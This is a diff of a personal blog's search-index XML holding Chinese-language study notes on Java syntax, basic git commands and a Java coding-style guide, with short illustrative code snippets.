+<h4 id="主要结构"><a href="#主要结构" class="headerlink" title="主要结构"></a>主要结构</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XXXXXX</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h4><p>数据范围小的变量可以直接赋值给数据范围大的变量</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span> a=<span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span>a;</span><br><span class="line"><span class="type">double</span> c=b;</span><br><span class="line">System.out.println(b)</span><br></pre></td></tr></table></figure>
+<p>另外注意在表达式中byte,short,char直接转化为Int型参与运算，因此byte+byte的结果类型必须定义为int。另外double&gt;float&gt;long&gt;int&gt;byte,short,char。一旦表达式有相应数据，则自动转化为大范围数据计算。</p>
+<h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><ul>
+<li>逻辑与”&amp;”:有一个为false,结果是false。</li>
+<li>短路与”&amp;”:一个是false，结果是false。<strong>前一个是false，后面的条件就不执行了</strong></li>
+<li>逻辑或”|”和短路或”||” <strong>同上解释</strong></li>
+<li>逻辑非”!”</li>
+<li>逻辑异或”^”:相同时false，不同时true</li>
+</ul>
+<h4 id="键盘录入"><a href="#键盘录入" class="headerlink" title="键盘录入"></a>键盘录入</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner<span class="comment">//导包</span></span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);<span class="comment">//建立对象 </span></span><br><span class="line">System.out.println(<span class="string">&quot;请输入密码：&quot;</span>)</span><br><span class="line"><span class="type">int</span> age=sc.nextInt()</span><br><span class="line">System.out.println(<span class="string">&quot;你输入的密码是：&quot;</span>+age)</span><br></pre></td></tr></table></figure>
+<h4 id="关于空格，空行的方法"><a href="#关于空格，空行的方法" class="headerlink" title="关于空格，空行的方法"></a>关于空格，空行的方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(i+<span class="string">&quot;\t&quot;</span>)<span class="comment">//数据之间的空格操作</span></span><br><span class="line">System.out.println()<span class="comment">//数据的空行操作</span></span><br></pre></td></tr></table></figure>
+<h4 id="案例小练习：猜数字"><a href="#案例小练习：猜数字" class="headerlink" title="案例小练习：猜数字"></a>案例小练习：猜数字</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> guessnumber;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">func</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Scanner sc=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        Random r=<span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> num=r.nextInt(<span class="number">100</span>)+<span class="number">1</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;已随机生成1-100的数字\n&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入你猜的数字\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> input=sc.nextInt();</span><br><span class="line">            <span class="keyword">if</span>(input&gt;num) System.out.println(<span class="string">&quot;你猜的数字过大&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(input&lt;num) System.out.println(<span class="string">&quot;你猜的数字过小&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;正确！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>[] ages=<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;<span class="comment">//静态初始化</span></span><br><span class="line"><span class="type">int</span>[]=&#123;input&#125;<span class="comment">//动态初始化</span></span><br><span class="line">System.out.println(ages.length)<span class="comment">//求数组长度</span></span><br></pre></td></tr></table></figure>
+<h4 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h4><p>同一个类，出现多个方法名称相同，形参列表不同这些方法叫重载方法。</p>
+<p>p.s. 返回值类型没关系</p>
+<p>如：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="title function_">void</span><span class="params">()</span>&#123;</span><br><span class="line">	代码段<span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="title function_">void</span><span class="params">(String a)</span></span><br><span class="line">&#123;</span><br><span class="line">	代码段<span class="number">2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="return单独使用"><a href="#return单独使用" class="headerlink" title="return单独使用"></a>return单独使用</h4><p>单写一个return，</p>
+<p>可以跳出并立即结束所在方法的执行</p>
+<h4 id="生成随机字符"><a href="#生成随机字符" class="headerlink" title="生成随机字符"></a>生成随机字符</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char ch=(char) (ra.nextInt(26)+65);//生成随机大写字母</span><br><span class="line">char ch2=(char) (ra.nextInt(26)+97);//生成随机小写字母</span><br></pre></td></tr></table></figure>
+<h4 id="String类常用api"><a href="#String类常用api" class="headerlink" title="String类常用api"></a>String类常用api</h4><p><strong>判断相等</strong>：在java中字符串内容比较不能使用”==”，因为java字符串表示的是地址。。</p>
+<p>如：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">string name=<span class="string">&quot;zrm&quot;</span>;</span><br><span class="line">string password=<span class="string">&quot;123456&quot;</span>;</span><br><span class="line">string in_name,in_password;</span><br><span class="line">cin&gt;&gt;in_name&gt;&gt;in_password;</span><br><span class="line"><span class="keyword">if</span>(in_name==name&amp;&amp;in_password==password) cout&lt;&lt;<span class="string">&quot;正确&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> cout&lt;&lt;<span class="string">&quot;错误&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>这一段C++代码是可以执行的，但是放在java中即使输入相同的名字密码都无法输出“正确”，因为定义的正确字符串存于常量区，而输入的字符串在堆内存中，两者的地址不一样，比较的结果是不相等。</p>
+<p>因此需要用到一个判断内容相等的api：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String name=<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">String password=<span class="string">&quot;123456&quot;</span>；</span><br><span class="line">Scanner sc=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in)</span><br><span class="line"><span class="comment">//定义接受输入内容的对象....</span></span><br><span class="line">name.equal(in_name)<span class="comment">//判断name字符串和in_name字符串内容是否相等，包括大小写检验</span></span><br><span class="line">password.equalIgnoreCase(in_password)<span class="comment">//判断前后是否相等，忽略大小写</span></span><br></pre></td></tr></table></figure>
+<p><strong>对字符串的操作</strong>:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str=<span class="string">&quot;abcdefg&quot;</span>;</span><br><span class="line">str.length();<span class="comment">//求字符串长度</span></span><br><span class="line">str.charAt(<span class="type">int</span> num);<span class="comment">//求字符串特定位置字符</span></span><br><span class="line">str.toCharArray();<span class="comment">//把字符串转成字符数组</span></span><br><span class="line">str.substring(<span class="type">int</span> first,<span class="type">int</span> last);<span class="comment">//截取，包前不包后</span></span><br><span class="line">str.substring(<span class="type">int</span> first);<span class="comment">//截取，从当前索引一直截取到末尾</span></span><br><span class="line">str.replace(String before,String <span class="keyword">new</span>);<span class="comment">//替换，把前一个内容全部替换成后一个内容</span></span><br><span class="line">str.contain(String s);<span class="comment">//判断是否包含，是返回true,否则返回false</span></span><br><span class="line">str.startsWith(String str);<span class="comment">//判断是否以此字符串开始</span></span><br><span class="line">String str2=<span class="string">&quot;aaa,bbb,ccc&quot;</span>;</span><br><span class="line">str.split(<span class="string">&quot;,&quot;</span>);<span class="comment">//按照&quot;,&quot;分开，返回字符串数组，需要有一个字符串数组对象接收返回值</span></span><br></pre></td></tr></table></figure>
+<h4 id="生成验证码第二种表达方式"><a href="#生成验证码第二种表达方式" class="headerlink" title="生成验证码第二种表达方式"></a>生成验证码第二种表达方式</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">special_number</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String str=<span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&quot;</span>;</span><br><span class="line">        Random ra=<span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        String res=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> num=ra.nextInt(str.length());</span><br><span class="line">            <span class="type">char</span> c=str.charAt(num);</span><br><span class="line">            res+=c;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="ArrayList类"><a href="#ArrayList类" class="headerlink" title="ArrayList类"></a>ArrayList类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;String&gt; list=<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();<span class="comment">//尖括号内约束数据类型</span></span><br><span class="line">list.add();<span class="comment">//直接添加</span></span><br><span class="line">list.add(<span class="type">int</span> index,type data);<span class="comment">//在指定位置插入元素</span></span><br><span class="line">list.get(<span class="type">int</span> index);<span class="comment">//获得指定位置元素</span></span><br><span class="line">list.size();<span class="comment">//获得元素个数</span></span><br><span class="line">list.remove(<span class="type">int</span> index);<span class="comment">//删除索引位置元素，返回被删除的元素值</span></span><br><span class="line">list.remove(Object o);<span class="comment">//删除容器内元素的值，如有多个相同值则删除第一个</span></span><br><span class="line">list.set(<span class="type">int</span> index,E element);<span class="comment">//修改索引位置的元素为后面的元素</span></span><br></pre></td></tr></table></figure>
+<h4 id="static使用"><a href="#static使用" class="headerlink" title="static使用"></a>static使用</h4><p>静态成员变量有static修饰，可以被共享使用，访问格式为：类名.变量 or 对象.变量。一般用在需要被共享的信息中</p>
+<p>实例成员变量无static修饰，只属于对象本身，访问格式为：对象.变量。一般用在每个对象共有的信息中</p>
+<p>静态成员方法用static修饰时，可以直接使用方法名调用，不需要对象.方法</p>
+<p>静态代码块：用于在程序启动时，进行静态资源初始化操作，格式：static{}</p>
+<p>单例：保证一个类只有一个对象</p>
+<h4 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> class&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>抽象方法，抽象类由abstract修饰，不用声明具体的方法体。一个方法如果声明为抽象方法，则该类必须为抽象类。使用场景：</p>
+<ul>
+<li>一般作为父类，让子类继承</li>
+<li>父类得知子类一定完成某种行为，但不知道具体行为，就先定义抽象方法，让子类具体定义</li>
+</ul>
+<p>注意：</p>
+<ul>
+<li><p>抽象类不一定有抽象方法，有抽象方法的类一定是抽象类。</p>
+</li>
+<li><p>一个类继承了抽象类，则它必须重写所有的抽象方法，否则它必须也定义为抽象类</p>
+</li>
+<li><p>抽象类得到了抽象方法，却失去了创建对象的能力（不能被实例化）</p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>编程语言</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+        <tag>语法</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>git的基本用法</title>
+    <url>/2022/09/13/git%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/</url>
+    <content><![CDATA[<p> git命令行的基本用法：</p>
+<span id="more"></span>
+<h3 id="Git-commit"><a href="#Git-commit" class="headerlink" title="Git commit"></a>Git commit</h3><p>提交内容，初始状态：</p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cl.jpg" alt=""></p>
+<p>输入指令:<strong>git commit</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cm.jpg" alt=""></p>
+<h3 id="Git-branch"><a href="#Git-branch" class="headerlink" title="Git branch"></a>Git branch</h3><p>形成一个新的分支，初始状态：</p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cn.jpg" alt=""></p>
+<p>输入指令：<strong>git branch newImage</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5co.jpg" alt=""></p>
+<p>输入指令：<strong>git checkout newImage + git commit</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cp.jpg" alt=""></p>
+<h3 id="Git-merge"><a href="#Git-merge" class="headerlink" title="Git merge"></a>Git merge</h3><p>合并分支，初始状态：</p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cq.jpg" alt=""></p>
+<p>输入指令<strong>git merge bugFix</strong>,此时会把bugFix包起来，注意当前指针指向Main</p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cr.jpg" alt=""></p>
+<p>此时调整指针到bugFix，再合并到main分支即可，命令行：<strong>git checkout bugFix + git merge main</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cs.jpg" alt=""></p>
+<h3 id="Git-rebase"><a href="#Git-rebase" class="headerlink" title="Git rebase"></a>Git rebase</h3><p>由并行状态合并为线性状态，初始状态：</p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5ct.jpg" alt=""></p>
+<p>输入指令：<strong>git rebase main</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cw.jpg" alt=""></p>
+<p>输入指令：<strong>git checkout main</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cu.jpg" alt=""></p>
+<p><strong>git rebase bugFix</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cv.jpg" alt=""></p>
+<h3 id="Git-branch-f-XXX-HEAD-n"><a href="#Git-branch-f-XXX-HEAD-n" class="headerlink" title="Git branch -f XXX HEAD~n"></a>Git branch -f XXX HEAD~n</h3><p>修改main分支到前几次的提交状态，初始状态：</p>
+<p><img src="https://i.niupic.com/images/2022/09/14/a5cP.jpg" alt=""></p>
+<p>指令<strong>git branch -f main HEAD~3</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/14/a5cQ.jpg" alt=""></p>
+<h3 id="Git-cherry-pick"><a href="#Git-cherry-pick" class="headerlink" title="Git cherry-pick"></a>Git cherry-pick</h3><p>将后交的状态复制到main分支中，初始状态：</p>
+<p><img src="https://i.niupic.com/images/2022/09/14/a5cR.jpg" alt=""></p>
+<p>指令<strong>git cherry-pick c2 c4</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/14/a5cS.jpg" alt=""></p>
+<h3 id="Git-rebase-1"><a href="#Git-rebase-1" class="headerlink" title="Git rebase"></a>Git rebase</h3><p>将已有的提交记录复制一份，可以自行选择顺序，分支，初始状态：</p>
+<p><img src="https://i.niupic.com/images/2022/09/14/a5cT.jpg" alt=""></p>
+<p>指令<strong>git rebase -i HEAD~4</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/14/a5cU.jpg" alt=""></p>
+]]></content>
+      <categories>
+        <category>乱七八糟的东东</category>
+      </categories>
+      <tags>
+        <tag>基础</tag>
+        <tag>git</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>“代码规范”</title>
+    <url>/2022/08/02/%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83/</url>
+    <content><![CDATA[<p> 软件开发代码规范:</p>
+<span id="more"></span>
+<h1 id="JAVA代码规范"><a href="#JAVA代码规范" class="headerlink" title="JAVA代码规范"></a>JAVA代码规范</h1><h2 id="普通规范"><a href="#普通规范" class="headerlink" title="普通规范"></a>普通规范</h2><h4 id="包的命名方式：公司域名倒置-子公司-产品名称-功能名称"><a href="#包的命名方式：公司域名倒置-子公司-产品名称-功能名称" class="headerlink" title="包的命名方式：公司域名倒置+子公司/产品名称+功能名称"></a>包的命名方式：公司域名倒置+子公司/产品名称+功能名称</h4><p>如：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">net.hedao.music</span><br><span class="line">net.hedao.uem.internal</span><br><span class="line">net.hedao.uem.http</span><br></pre></td></tr></table></figure>
+<h4 id="utils和tools命名规范"><a href="#utils和tools命名规范" class="headerlink" title="utils和tools命名规范"></a>utils和tools命名规范</h4><p>utils:</p>
+<ul>
+<li>定义：通用的，与业务无关，可供其他项目使用</li>
+<li>方法通常是public static;一般无类的属性，有的话也是public static</li>
+<li>例子：字符串类，文件工具类</li>
+</ul>
+<p>tools:</p>
+<ul>
+<li>定义：在当前项目通用；仅能在当前项目使用</li>
+<li>方法通常是public static;一般无类的属性，有的话也是public static</li>
+<li>用户校验类，支付工具类</li>
+</ul>
+<h4 id="类名规范"><a href="#类名规范" class="headerlink" title="类名规范"></a>类名规范</h4><p>类名首字母大写，若多个单词拼合则采取驼峰式命名</p>
+<p>如：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestDemo</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="成员属性"><a href="#成员属性" class="headerlink" title="成员属性"></a>成员属性</h4><p>成员属性，变量名使用有含义的单词或词组构成；</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">long</span> abc=<span class="number">0</span>;<span class="comment">//禁止</span></span><br></pre></td></tr></table></figure>
+<p>常量必须由大写字母和下划线分割单词的方式组成</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MAX_NUMBER</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br></pre></td></tr></table></figure>
+<p>静态变量:采用小写s开头，代表static，s后首字母大写，遵循驼峰原则</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">long</span> sCurrentTime;</span><br></pre></td></tr></table></figure>
+<p>实体类，java bean类中普通成员变量采用小写字母开头，单词之间采用驼峰式命名规范。</p>
+<p>注：此类用于存储数据，只有setter,getter方法，不作其他业务处理</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>&#123;</span><br><span class="line">			<span class="keyword">private</span> String userName;</span><br><span class="line">			<span class="keyword">private</span> String userAccount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="方法的命名规范"><a href="#方法的命名规范" class="headerlink" title="方法的命名规范"></a>方法的命名规范</h4><p>方法命名采用小写字母开头，字母之间采用驼峰式命名规范，一般不超过20个字符，长度很长时可以使用简写</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">long</span> <span class="title function_">calculateScreenSize</span><span class="params">()</span> &#123;<span class="comment">//计算屏幕尺寸，正确</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> UserInfo <span class="title function_">getCustomUInfo</span><span class="params">()</span> &#123;<span class="comment">//获取客户个人信息，正确</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">long</span> <span class="title function_">size</span><span class="params">()</span> &#123;<span class="comment">//计算屏幕尺寸，错误</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> UserInfo <span class="title function_">getCustomUserInfomation</span><span class="params">()</span> &#123;<span class="comment">//获取客户个人信息，错误</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="注释规范"><a href="#注释规范" class="headerlink" title="注释规范"></a>注释规范</h2><p>注释：</p>
+<ul>
+<li>屏蔽不需要执行的代码</li>
+<li>对代码进行解释说明</li>
+</ul>
+<h4 id="类的注释"><a href="#类的注释" class="headerlink" title="类的注释"></a>类的注释</h4><p>类的注释采用多行注释方式，在包名和类定义中间，通常记录作者信息，版本号，类的功能描述信息等。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment">* 文件工具类</span></span><br><span class="line"><span class="comment">* 项目名称:JAVA编码规范测试用例</span></span><br><span class="line"><span class="comment">* 包:net.herdao.common.utils   </span></span><br><span class="line"><span class="comment">* 类名称:FileUtils.java</span></span><br><span class="line"><span class="comment">* 类描述:本类是一个文件操作工具类，包括了文件的几个基本操作方法，创建文件、删除文件、文件重命名</span></span><br><span class="line"><span class="comment">* 创建人:林鸿亮</span></span><br><span class="line"><span class="comment">* 创建时间:2021/10/21 11:46</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileUtils</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="方法的注释"><a href="#方法的注释" class="headerlink" title="方法的注释"></a>方法的注释</h4><p>多行注释，主要内容记录该方法的<strong>作用</strong>，<strong>参数及参数说明</strong>，<strong>返回值</strong>、<strong>返回类容</strong>和<strong>异常信息说明</strong>，<strong>修改记录</strong>，<strong>是否过期</strong>，及<strong>修改日期</strong>等等。</p>
+<p>我们规定所有public类型的方法必须加上注释<strong>对方法和参数</strong>加以说明，private方法中如果处理逻辑相对较多，相对复杂的也应加上注释。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 在指定目录创建一个新文件</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> dirPath  文件目录路径</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> fileName 文件名称</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span>  返回创建的新文件</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> File <span class="title function_">createeNewFile</span><span class="params">(String dirPath, String fileName)</span> </span><br><span class="line">&#123;<span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dirPath,fileName);</span><br><span class="line"> <span class="keyword">return</span> file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="成员属性的注释"><a href="#成员属性的注释" class="headerlink" title="成员属性的注释"></a>成员属性的注释</h4><p>可以使用单行注释也可以使用多行注释</p>
+<p>代码块和单行代码通常采用单行注释</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deleteFile</span><span class="params">(File file)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (file != <span class="literal">null</span> &amp;&amp; file.exists()) &#123; <span class="comment">//判断文件是否存在</span></span><br><span class="line">file.delete(); <span class="comment">//删除文件</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="代码格式规范"><a href="#代码格式规范" class="headerlink" title="代码格式规范"></a>代码格式规范</h3><h4 id="统一编码格式"><a href="#统一编码格式" class="headerlink" title="统一编码格式"></a>统一编码格式</h4><p>统一采用UTF-8的格式</p>
+<h4 id="编码的缩进"><a href="#编码的缩进" class="headerlink" title="编码的缩进"></a>编码的缩进</h4><p>缩进空格数为4，同一业务级代码块保持左对齐，不能全在同一垂直线上</p>
+<h4 id="代码行宽度"><a href="#代码行宽度" class="headerlink" title="代码行宽度"></a>代码行宽度</h4><p>单行代码最长不得超过120列</p>
+<h4 id="代码行长度"><a href="#代码行长度" class="headerlink" title="代码行长度"></a>代码行长度</h4><p>方法长度限制在100行内，若有超过可能按照<strong>业务逻辑</strong>拆分成多个方法</p>
+<h4 id="属性及方法的范围确定"><a href="#属性及方法的范围确定" class="headerlink" title="属性及方法的范围确定"></a>属性及方法的范围确定</h4><ul>
+<li><p>public : 当某个方法或属性需要<strong>被外部非子类和非同包内中的对象直接调用</strong>的时候采用public属性。</p>
+</li>
+<li><p>protected : 当某个方法或属性<strong>只会被其子类调用</strong>或者<strong>只会同一包下的其他对象调用</strong>时，使用protected限制。</p>
+</li>
+<li><p>private: 当某个方法或属性<strong>只会被本类中的其他方法调用</strong>的时候，使用private限制。</p>
+</li>
+</ul>
+<h4 id="硬编码的后遗症"><a href="#硬编码的后遗症" class="headerlink" title="硬编码的后遗症"></a>硬编码的后遗症</h4><p>常量字符串或数值必须<strong>在类中定义常量值</strong>，通过<strong>常量值引用</strong>来使用固定数值和固定字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">public static final int MIN_DATA = 1;</span><br><span class="line">public static final int MAX_DATA = 99;</span><br><span class="line">public static final String STR_SUM = &quot;岗位评分结果为=&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">private void printSum() &#123;</span><br><span class="line">System.out.println(STR_SUM+(MIN_DATA+MAX_DATA));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="TODO规范"><a href="#TODO规范" class="headerlink" title="TODO规范"></a>TODO规范</h4><p>用来描述已知待改进，待补充的修改点，加上作者名称</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// TODO &lt;“作者名称”&gt;: 补充XX处理</span><br></pre></td></tr></table></figure>
+<h4 id="方法参数规范"><a href="#方法参数规范" class="headerlink" title="方法参数规范"></a>方法参数规范</h4><p>每个方法最多三个参数，超出三个要封装成javabean对象</p>
+<h4 id="SysLog日志注解使用"><a href="#SysLog日志注解使用" class="headerlink" title="@SysLog日志注解使用"></a>@SysLog日志注解使用</h4><p>接口涉及增删改数据时必须使用@SysLog注解。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ApiOperation(value = &quot;权限配置-修改用户角色&quot;,notes = &quot;权限配置-修改用户角色&quot;)</span></span><br><span class="line"><span class="meta">@SysLog(&quot;权限配置-修改用户角色&quot;)</span></span><br><span class="line"><span class="meta">@PutMapping(value = &quot;/editUserRole&quot;)</span></span><br><span class="line"><span class="keyword">public</span> R&lt;Boolean&gt; <span class="title function_">saveUserRole</span><span class="params">(<span class="meta">@RequestBody</span> UserDTO userDTO)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(userDTO.getUserId() == <span class="literal">null</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> R.failed(Boolean.FALSE).setMsg(<span class="string">&quot;用户id不能为空&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> R.ok(userService.saveUserRole(userDTO));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="工程框架规范"><a href="#工程框架规范" class="headerlink" title="工程框架规范"></a>工程框架规范</h3><h4 id="应用分层"><a href="#应用分层" class="headerlink" title="应用分层"></a>应用分层</h4><p>代码分层为MVC方式，<strong>不能</strong>用DDD方式修改代码目录结构</p>
+<h4 id="依赖包管理版本规范"><a href="#依赖包管理版本规范" class="headerlink" title="依赖包管理版本规范"></a>依赖包管理版本规范</h4><p>基础平台父工程hdp已经引入绝大部分开发所需maven 依赖包，如果需要增加依赖包必须先征得架构师同意。业务项目<strong>不得重复添加已有依赖包</strong>，所添加依赖包版本必须<strong>与基础平台依赖包版本一致</strong>，引入后必须<strong>处理依赖冲突</strong>。</p>
+]]></content>
+      <categories>
+        <category>编程语言</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+        <tag>常用规范</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>位运算</title>
     <url>/2022/09/21/%E4%BD%8D%E8%BF%90%E7%AE%97/</url>
-    <content><![CDATA[<p>位运算基础概念以及题目：</p>
+    <content><![CDATA[<p> 位运算基础概念以及题目：</p>
 <span id="more"></span>
-<h3 id="概念">概念</h3>
-<h4 id="位与">位与</h4>
